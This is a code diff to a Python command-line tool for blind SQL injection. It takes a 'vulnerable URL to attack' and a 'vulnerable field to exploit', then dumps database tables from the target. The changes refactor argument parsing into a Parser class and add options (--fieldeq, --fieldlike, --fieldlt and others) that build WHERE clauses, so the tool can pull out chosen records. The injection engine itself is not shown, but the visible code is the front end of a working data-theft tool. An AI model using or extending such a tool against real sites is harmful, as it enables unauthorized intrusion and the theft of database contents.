@@ -199,9 +199,9 @@ class Table:
             record = Record(self)
             for col in self.columns:
                 data = self.getRecordData(i, col, where)
-                PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 2)
+                PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 1)
                 record.setData(col, data)
-            PRINTER.print("Finished building record: %s" % record.data, 1)
+            PRINTER.print("", 1)
             self.records.append(record)
 
 
@@ -217,65 +217,116 @@ class Record:
             self.data[column] = data
 
 
-parser = argparse.ArgumentParser()
-parser.add_argument('url', help='The vulnerable URL to attack')
-parser.add_argument('success', help='A string returned by a successful query but NOT by a failed query')
-parser.add_argument('attack_field', help='The vulnerable field to exploit')
 
-other_help = 'Other fields to submit, if necessary.\n'
-other_help += 'To specify a value with a field, append the value with ":".\n\n'
-other_help += 'Example:\n'
-other_help += '\tusername:root'
-parser.add_argument('other_field', help=other_help, nargs='*')
-
-parser.add_argument('-o', '--outfile', '--out', help='Print results to OUTFILE upon completion', nargs='?', type=argparse.FileType('w'), default=None)
-parser.add_argument('-d', '--delay', type=int, help='Time (in ms) to wait between queries (default: %(default)s)', nargs='?', const=DEFAULT_DELAY, default=DEFAULT_DELAY)
-parser.add_argument('-v', '--verbose', action='count')
-
-table_group = parser.add_mutually_exclusive_group()
-table_group.add_argument('-t', '--tables_only', action='store_true', help='Only dump table names')
-
-dump_table_help = 'Dump data only from the specified table.\n'
-dump_table_help += "To specify the table's schema, prepend it with a period: SCHEMA.TABLE\n"
-dump_table_help += "If no schema is specified, the current schema will be used."
-table_group.add_argument('-T', '--dump_table', help=dump_table_help)
 
 class TableWhereAction(argparse.Action):
     def __call__(self, parser, namespace, value, option_string):
         if namespace.dump_table is None:
             parser.error('Where clauses can only be used with single-table dumps.')
         else:
-            namespace.where = value
+            setattr(namespace, self.dest, value)
 
-parser.add_argument('-w', '--where', action=TableWhereAction, help='Where clause to use with -T/--dump_table')
+class TableFieldsAction(argparse.Action):
+    def __call__(self, parser, namespace, values, option_string):
+        if namespace.dump_table is None:
+            parser.error('Where clauses can only be used with single-table dumps.')
+        else:
+            curval = getattr(namespace, self.dest)
+            if curval is not None:
+                values = curval + values
+            setattr(namespace, self.dest, values)
 
-args = parser.parse_args()
-verbosity = 0 if args.verbose is None else args.verbose
-PRINTER = Printer(verbosity, args.outfile)
-delay = DEFAULT_DELAY if args.delay is None else args.delay
-other_fields = {}
-for field in args.other_field:
-	spl = field.split(":", 1)
-	if len(spl) == 1:
-		other_fields[spl[0]] = ''
-	else:
-		other_fields[spl[0]] = spl[1]
+class Parser:
+
+    def __init__(self):
+        parser = argparse.ArgumentParser()
+        parser.add_argument('url', help='The vulnerable URL to attack')
+        parser.add_argument('success', help='A string returned by a successful query but NOT by a failed query')
+        parser.add_argument('attack_field', help='The vulnerable field to exploit')
+
+        other_help = 'Other fields to submit, if necessary.\n'
+        other_help += 'To specify a value with a field, append the value with a colon -- FIELD:VALUE'
+        parser.add_argument('other_field', help=other_help, nargs='*')
+
+        parser.add_argument('-o', '--outfile', '--out', help='Print results to OUTFILE upon completion', nargs='?', type=argparse.FileType('w'), default=None)
+        parser.add_argument('-d', '--delay', type=int, help='Wait DELAY ms between queries', nargs='?', const=DEFAULT_DELAY, default=DEFAULT_DELAY)
+        parser.add_argument('-v', '--verbose', action='count')
+
+        table_group = parser.add_mutually_exclusive_group()
+        table_group.add_argument('-t', '--tables_only', action='store_true', help='Only dump table names')
+
+        dump_table_help = 'Dump data only from TABLE.'
+        dump_table_help += "To specify the table's schema, prepend it with a period -- SCHEMA.TABLE"
+        table_group.add_argument('-T', '--dump_table', help=dump_table_help, metavar="TABLE")
+
+        parser.add_argument('-w', '--where', action=TableWhereAction, help='Where clause to use with -T/--dump_table')
+        feq_help = 'Only dump records in which FIELD equals VALUE.'
+        feq_help += ' See also: --fieldlike, --fieldlt, --fieldgt, --fieldlte, --fieldgte'
+        parser.add_argument('--fieldeq', nargs=2, action=TableFieldsAction, help=feq_help, metavar=("FIELD", "VALUE"))
+        parser.add_argument('--fieldlike', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
+        parser.add_argument('--fieldlt', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
+        parser.add_argument('--fieldgt', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
+        parser.add_argument('--fieldlte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
+        parser.add_argument('--fieldgte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
+
+        
+        self.args = parser.parse_args()
+
+    def parseOtherFields(self):
+        other_fields = {}
+        for field in self.args.other_field:
+                spl = field.split(":", 1)
+                if len(spl) == 1:
+                        other_fields[spl[0]] = ''
+                else:
+                        other_fields[spl[0]] = spl[1]
+        return other_fields
+
+    def parseFieldArgs(self, fieldargs, formatString):
+        if fieldargs is None:
+            return ''
+        where = ''
+        for x in range(0, len(fieldargs), 2):
+            where += formatString % (fieldargs[x], fieldargs[x+1])
+            where += ' AND '
+        return where
+
+    def parseWhere(self):
+        if (self.args.where is None and self.args.fieldeq is None
+            and self.args.fieldlike is None and self.args.fieldlt is None
+            and self.args.fieldgt is None and self.args.fieldlte is None
+            and self.args.fieldgte is None):
+            return None
+        where = '1=1 AND ' if self.args.where is None else '%s AND ' % self.args.where
+        where += self.parseFieldArgs(self.args.fieldeq, "%s = '%s'")
+        where += self.parseFieldArgs(self.args.fieldlike, "%s LIKE '%%%s%%'")
+        where += self.parseFieldArgs(self.args.fieldlt, "%s < %s")
+        where += self.parseFieldArgs(self.args.fieldgt, "%s > %s")
+        where += self.parseFieldArgs(self.args.fieldlte, "%s <= %s")
+        where += self.parseFieldArgs(self.args.fieldgte, "%s >= %s")
+        return where[:-5]
 
 
 
-injector = Injector(args.url, args.success, delay, args.attack_field, other_fields)
+p = Parser()
+
+verbosity = 0 if p.args.verbose is None else p.args.verbose
+PRINTER = Printer(verbosity, p.args.outfile)
+
+delay = DEFAULT_DELAY if p.args.delay is None else p.args.delay
+injector = Injector(p.args.url, p.args.success, delay, p.args.attack_field, p.parseOtherFields())
 db = Database(injector)
-if args.dump_table is None:
-    db.findTables(not args.tables_only)
+if p.args.dump_table is None:
+    db.findTables(not p.args.tables_only)
 else:
-    s = args.dump_table.split(".")
+    s = p.args.dump_table.split(".")
     if len(s) == 1:
         print("Dumping table %s" % s[0])
         table = Table(injector, s[0], db.default_schema, db.columns_table)
     else:
         print("Dumping table %s.%s" % (s[0], s[1]))
         table = Table(injector, s[1], s[0], db.columns_table)
-    table.populate(args.where)
+    table.populate(p.parseWhere())
     db.tables.append(table)
 
 PRINTER.printToFile("========== DATABASE DUMP ==========")
